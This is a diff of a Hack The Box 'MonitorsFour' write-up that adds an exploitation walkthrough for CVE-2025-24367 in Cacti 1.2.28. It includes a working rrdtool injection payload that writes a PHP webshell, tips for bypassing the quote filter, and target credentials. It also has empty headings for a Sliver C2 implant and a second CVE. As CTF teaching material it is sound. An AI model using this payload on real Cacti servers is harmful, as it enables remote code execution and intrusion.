@@ -548,7 +548,7 @@ password `wonderful1`.
 
 ## Login to main website
 
-- With the credentials `admin:wonderful1` is became possible to login to the main website.
+- With the credentials `admin:wonderful1` it became possible to login to the main website.
 
 ![Main website http://monitorsfour.htb](5.png)
 
@@ -600,4 +600,123 @@ network address. So it was assumed that may be cacti was in a container too.
 
 ## CVE-2025-24367
 
-According to the Github Advisory [XXX](), an authenticated user can ...
+According to the Github Advisory [GHSA-fxrq-fr7h-9rqq](https://github.com/Cacti/cacti/security/advisories/GHSA-fxrq-fr7h-9rqq), an authenticated user can deposit arbitrary php scripts at the
+webroot of Cacti <= 1.2.28, by abusing the graph creation and graph template functionality, leading to
+remote code execution.
+
+[Vulhub](https://github.com/vulhub/vulhub/tree/master/cacti/CVE-2025-24367) provides a docker based environment for experimenting with this vulnerability on Cacti 1.2.28.
+So Cacti 1.2.28 was first deployed locally to experiment with the vulnerability and refine the payload
+where necessary.
+
+### Testing CVE-2025-24367 locally
+
+To exploit this vulnerability, the procedure is as follows:
+
+- Go to `Console -> Templates -> Graph` and search for `PING - Advanced Ping`.
+
+![Graph Templates PING - Advanced Ping](9.png)
+
+- Select it, turn on Burpsuite intercept and click on the `Save` button at the bottom of the
+`PING - Advanced Ping` page.
+
+![Save buttong PING - Advanced Ping page](10.png)
+
+- Inside Burp, modify the value of the `right_axis_label`  parameter with the following payload
+
+```
+XXX
+create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200
+graph shell.php -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=passthru(base64_decode($_GET[chr(99)]));?>
+```
+
+- The section of the payload which is shown below is our php webshell
+
+```php
+<?=passthru(base64_decode($_GET[chr(99)]));?>
+```
+
+- `chr(99)` is the encoded character `c`
+- So our payload actually translates to
+
+```php
+<?=passthru(base64_decode($_GET['c']));?>
+```
+
+- This char encoding was used because providing a quoted string within the payload causes
+the quotes to get replaced and our webshell doesn't work properly
+
+```php
+<?=passthru(base64_decode($_GET['cmd']));?>
+```
+
+```php
+"time","<?=passthru(base64_decode($_GET[\cmd\]));?>"
+1770353400,"NaN"
+```
+
+- Additionally, testing the exploit locally revealed that only a single character can be encoded in this
+way for the payload to still work properly.
+- Concatenating encoded characters as shown below didn't work.
+
+```php
+# decoded
+<?=passthru(base64_decode($_GET['cmd']));?>
+```
+
+```php
+# encoded
+<?=passthru(base64_decode($_GET[chr(99).chr(109).chr(100)]));?>
+```
+
+- Select the whole payload in Burpsuite and press Ctrl+U to url encode it
+
+![right_axis_label payload Burpsuite](11.png)
+
+- Then manually replace every instance of new line within the payload to `%0A`, so that the payload will
+appear in Burp as a single line.
+
+![right_axis_label payload, newline replaced](12.png)
+
+- Forward the request to the target server and turn off Burp's intercept.
+
+- Navigate to `Console -> Create -> New Graphs` and create a graph using the template `PING - Advanced Ping`
+
+![Create new graph with template PING - Advanced Ping](13.png)
+
+- Navigate to `Graphs -> Default Tree -> Local Linux Machine` to trigger the payload execution.
+An error saying  `ERROR: creating arguments` should appear. It is the signal that the payload was executed.
+
+- The file `shell.php` should be created at the root of the cacti instance `/var/www/html`
+
+![shell.php created at Cacti root](14.png)
+
+- It can be tested using the base64 encoded `id` command.
+
+![testing shell.php](15.png)
+
+
+### Testing CVE-2025-24367 against cacti.monitorsfour.htb
+
+The same exploitation procedure was used against `cacti.monitorsfour.htb`. However, some peculiar differences
+where found:
+
+- The message "The Cacti Poller has not yet run", when trying to trigger the exploit from:
+`Graphs -> Default Tree -> Local Linux Machine`.
+
+![Perculiar error message in cacti of monitorsfour](16.png)
+
+- The location of `shell.php`, which was available at the `/cacti` path.
+
+![Location of shell.php at /cacti](17.png)
+
+![Testing shell.php on cacti.monitorsfour.htb](18.png)
+
+
+# Post Exploitation
+
+## Why did the `?token` parameter fuzzing Work ?
+
+## Deploying Sliver C2 implant
+
+## CVE-2025-9074
+
